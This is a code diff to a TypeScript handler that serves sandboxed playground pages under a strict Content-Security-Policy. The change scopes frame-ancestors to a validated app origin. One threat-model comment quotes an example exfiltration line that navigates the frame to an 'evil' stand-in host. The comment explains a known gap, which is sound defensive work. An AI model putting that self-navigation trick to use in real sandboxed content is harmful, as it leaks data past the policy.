@@ -1,5 +1,6 @@
 import type { ArtifactStore, Catalog } from '../storage/index.js';
 import { PlaygroundId, PlaygroundNotFoundError, currentVersionOf } from '../storage/index.js';
+import type { AppOrigin } from './originGuard.js';
 
 // THE SANDBOX ENFORCEMENT BOUNDARY — and the ONLY one. This handler is what runs on the
 // CONTENT ORIGIN: a foreign origin from the app, whose entire job is to hand a playground's
@@ -10,8 +11,9 @@ import { PlaygroundId, PlaygroundNotFoundError, currentVersionOf } from '../stor
 // The read path is catalog -> version -> store and NEVER touches the provider, so the whole
 // commons/use surface works with generation entirely off. [LAW:decomposition]
 
-// The Content-Security-Policy carried on every served playground. The intent the ticket
-// states — deny-all baseline, no network — at full resolution:
+// The Content-Security-Policy carried on every served playground, as a function of the ONE origin
+// permitted to frame it (the app). The intent — deny-all baseline, no network, framed only by the app —
+// at full resolution:
 //   default-src 'none'   : nothing is allowed unless re-permitted below.
 //   script-src/style-src 'unsafe-inline' : a self-contained playground IS inline code; this
 //                          is what lets it RUN. It still cannot load any EXTERNAL script or
@@ -20,37 +22,59 @@ import { PlaygroundId, PlaygroundNotFoundError, currentVersionOf } from '../stor
 //   connect-src 'none'   : the real containment — no fetch/XHR/WebSocket/beacon, so a
 //                          hostile playground cannot phone home or exfiltrate.
 //   form-action/base-uri 'none' : no posting out, no <base> hijack.
-// frame-ancestors is deliberately left unset: the app's player MUST be able to frame this.
-const PLAYGROUND_CSP = [
-  "default-src 'none'",
-  "script-src 'unsafe-inline'",
-  "style-src 'unsafe-inline'",
-  'img-src data: blob:',
-  'font-src data:',
-  "connect-src 'none'",
-  "form-action 'none'",
-  "base-uri 'none'",
-].join('; ');
+//   frame-ancestors <app origin> : ONLY the app's player may frame a playground — a third party cannot
+//                          hotlink/embed it as if their own. It was formerly left unset (any site could
+//                          frame). Scoping it to exactly the app origin is defense-in-depth against
+//                          embedding abuse; risk was already low (opaque frame + connect-src 'none'), so
+//                          this is belt-and-suspenders, not the primary containment.
+//
+// ACCEPTED RESIDUAL (threat model R3 — outbound navigation): connect-src 'none' stops fetch/XHR/
+// WebSocket/beacon, but it does NOT stop the framed document navigating ITSELF away —
+// `location = 'https://evil?…'`. The sandbox permits a same-frame navigation, and CSP's `navigate-to`
+// directive that would block it is unshipped in browsers. This is DOCUMENTED AND ACCEPTED, not fixed:
+// the frame is opaque-origin and holds nothing sensitive (no app cookies, storage, or session), so a
+// self-navigation carries nothing worth exfiltrating — the severity is low. If `navigate-to` ships, add
+// it here. [LAW:no-silent-failure]
+const playgroundCsp = (appOrigin: AppOrigin): string =>
+  [
+    "default-src 'none'",
+    "script-src 'unsafe-inline'",
+    "style-src 'unsafe-inline'",
+    'img-src data: blob:',
+    'font-src data:',
+    "connect-src 'none'",
+    "form-action 'none'",
+    "base-uri 'none'",
+    `frame-ancestors ${appOrigin}`,
+  ].join('; ');
 
 export interface ContentHandlerDeps {
   readonly catalog: Catalog;
   readonly store: ArtifactStore;
+  // The app's origin — the ONE origin permitted to frame a served playground, scoped into the CSP's
+  // frame-ancestors. The branded AppOrigin type carries the guarantee that this is a VALIDATED bare
+  // origin (minted only through appOriginOf/AppOrigin), so an unvalidated string can never reach the
+  // frame-ancestors directive. The handler knows "who may frame me" without knowing anything about OAuth.
+  // [LAW:types-are-the-program] [LAW:decomposition]
+  readonly appOrigin: AppOrigin;
 }
 
-// Every response from the content origin — html and errors alike — carries the strict CSP
-// and nosniff. There is no path out of this handler that serves anything permissively.
-const sealed = (body: string, status: number, contentType: string): Response =>
-  new Response(body, {
-    status,
-    headers: {
-      'content-type': contentType,
-      'content-security-policy': PLAYGROUND_CSP,
-      'x-content-type-options': 'nosniff',
-    },
-  });
-
 export const makeContentHandler = (deps: ContentHandlerDeps): ((request: Request) => Promise<Response>) => {
-  const { catalog, store } = deps;
+  const { catalog, store, appOrigin } = deps;
+  // The CSP is a value derived once from the app origin (fixed for this handler's life), not a
+  // per-request branch. [LAW:dataflow-not-control-flow]
+  const csp = playgroundCsp(appOrigin);
+  // Every response from the content origin — html and errors alike — carries the strict CSP
+  // and nosniff. There is no path out of this handler that serves anything permissively.
+  const sealed = (body: string, status: number, contentType: string): Response =>
+    new Response(body, {
+      status,
+      headers: {
+        'content-type': contentType,
+        'content-security-policy': csp,
+        'x-content-type-options': 'nosniff',
+      },
+    });
   return async (request: Request): Promise<Response> => {
     const url = new URL(request.url);
     if (request.method !== 'GET' || url.pathname !== '/') {
